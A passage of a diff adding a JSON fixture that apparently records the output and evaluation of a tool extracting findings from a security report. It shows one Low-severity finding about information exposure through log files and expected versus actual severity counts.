+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Information exposure through log files",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Information exposure through log files affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-011",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "information exposure through log files",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-011|information exposure through log files|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Information exposure through log files",
+        "sourceText": "ZCA-011 Information exposure through log files Low",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Information exposure through log files",
+      "canonicalKey": "ZCA-011|information exposure through log files|investigation scope||||||"
+    }
+  ],
+  "eval": {
+    "enableNlp": true,
+    "expectedCount": 11,
+    "actualCount": 11,
+    "expectedSeverityCounts": {
+      "Critical": 0,
+      "High": 2,
+      "Medium": 3,
+      "Low": 6
+    },
+    "actualSeverityCounts": {
+      "Critical": 0,
+      "High": 2,
+      "Medium": 3,
+      "Low": 6
+    },
+    "duplicates": 0,
+    "negativeHits": 0,
+    "pass": true
+  }
+}
